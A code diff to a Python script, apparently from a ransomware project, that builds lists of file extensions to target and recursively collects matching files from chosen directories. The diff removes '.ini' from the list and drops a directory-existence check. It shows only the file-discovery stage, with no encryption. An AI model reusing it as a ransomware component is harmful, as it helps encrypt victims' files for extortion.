@@ -11,7 +11,7 @@ def is_important_file(file):
         'compressed_files': ['.zip', '.rar', '.7z', '.tar', '.gz', '.tar.gz', '.bz2', '.xz', '.cab'],
         'executable_files': ['.exe', '.msi', '.bat', '.sh', '.apk', '.jar', '.bin', '.deb', '.rpm'],
         'code_files': ['.py', '.java', '.c', '.cpp', '.cs', '.js', '.html', '.css', '.php', '.swift', '.go', '.rs', '.ts'],
-        'configuration_files': ['.ini', '.cfg', '.json', '.yaml', '.yml', '.toml', '.env'],
+        'configuration_files': ['.cfg', '.json', '.yaml', '.yml', '.toml', '.env'],
         'design_files': ['.psd', '.ai', '.xd', '.fig', '.sketch'],
         'encrypted_extension': ['.encrypted'] # Extensión archivos cifrados por el ransomware (descifrado)
     }
@@ -44,13 +44,11 @@ def find_files():
 def walk_directories(target_directories):  
     important_files = []  # Lista para almacenar los archivos importantes encontrados
     for directory in target_directories:  # Itera sobre cada directorio en la lista de directorios objetivo
-        if os.path.exists(directory):  # Verifica si el directorio existe
             for root, _, files in os.walk(directory):  # Recorre el directorio de manera recursiva
                 for file in files:  # Itera sobre los archivos en el directorio actual
                     if is_important_file(file):  # Verifica si el archivo es importante
                         # Agrega la ruta absoluta del archivo importante a la lista
                         important_files.append(os.path.join(root, file))  
-
     return important_files  # Devuelve una lista con las rutas absolutas de los archivos importantes
 
 
